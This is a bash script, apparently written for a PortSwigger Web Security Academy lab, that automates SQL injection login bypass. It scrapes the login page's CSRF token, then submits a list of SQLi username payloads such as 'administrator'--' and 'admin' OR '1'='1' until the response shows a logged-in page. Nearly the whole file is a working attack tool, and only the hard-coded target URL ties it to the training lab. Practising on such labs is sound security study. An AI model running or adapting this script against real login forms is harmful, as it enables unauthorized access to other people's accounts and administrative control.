#!/bin/bash

# day18-login-bypass.sh
# Purpose: Automate SQLi Login Bypass for PortSwigger labs with session-tied CSRF protection

TARGET="https://0a3e00fd03b5a49087d715c0008200ac.web-security-academy.net"
LOGIN_URL="$TARGET/login"

echo "[*] Starting SQLi Login Bypass Test..."
echo "[*] Target: $LOGIN_URL"

# Step 1: Fetch login page while saving cookies
echo "[*] Fetching login page and storing session..."
curl -s -c cookies.txt "$LOGIN_URL" -o login-page.html

# Step 2: Extract CSRF token from HTML
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' login-page.html)

if [ -z "$CSRF" ]; then
  echo "[!] Failed to extract CSRF token."
  exit 1
fi

echo "[*] CSRF token: $CSRF"

# Step 3: Try SQLi login
PAYLOADS=(
  "administrator'--"
  "administrator'--+"
  "administrator'#"
  "administrator' OR 1=1--"
  "admin' OR '1'='1"
)

for USERNAME in "${PAYLOADS[@]}"; do
  echo "[*] Trying payload: $USERNAME"

  curl -s -b cookies.txt -c cookies.txt -X POST "$LOGIN_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "csrf=$CSRF&username=$USERNAME&password=random" \
    -L -o login-response.html

  if grep -qi "Log out\|My account\|Welcome" login-response.html; then
    echo "[+] SUCCESS: Logged in as admin with payload: $USERNAME"
    exit 0
  else
    echo "[-] Failed with payload: $USERNAME"
  fi
done

echo "[!] All payloads failed. Check login-response.html manually."
